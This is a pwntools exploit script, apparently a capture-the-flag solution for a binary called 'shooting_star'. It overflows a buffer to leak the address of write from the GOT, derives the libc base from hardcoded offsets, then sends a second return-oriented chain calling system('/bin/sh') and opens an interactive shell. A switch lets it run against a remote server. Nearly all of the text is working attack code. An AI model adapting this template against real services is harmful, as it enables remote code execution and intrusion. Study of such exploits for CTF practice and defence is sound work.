from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('> ', b'1')
    p.sendlineafter('>> ', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
b *main
continue
'''.format(**locals())

# Binary filename
exe = './shooting_star'

context.terminal = ['gnome-terminal', '-e']

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

pop_rdi = 0x4012cb # pop rdi; ret
pop_rsi_r15 = 0x4012c9 # pop rsi; pop r15; ret

info("%#x pop_rdi", pop_rdi)
info("%#x pop_rsi_r15", pop_rsi_r15)

payload = flat({
    offset: [
        pop_rsi_r15,
        elf.got.write,
        0x0,
        elf.plt.write,
        elf.symbols.main
   ]
})

io.sendlineafter('> ', b'1')
io.sendlineafter('>> ', payload)

io.recvuntil("May your wish come true!\n")

leaked_addr = io.recv()

print(leaked_addr)

got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
info("%#x leak_got_write", got_write)

#libc_base = got_write - 0x104020
libc_base = got_write - 0x110210

system_addr = libc_base + 0x04f550

bin_sh = libc_base + 0x1b3e1a


info("%#x libc_base", libc_base)
info("%#x system_addr", system_addr)
info("%#x bin_sh", bin_sh)
info("%#x got write", elf.got.write)

payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        system_addr
   ]
})

io.sendline(b'1')
io.sendlineafter('>> ', payload)

io.recvuntil("May your wish come true!\n")

io.interactive()



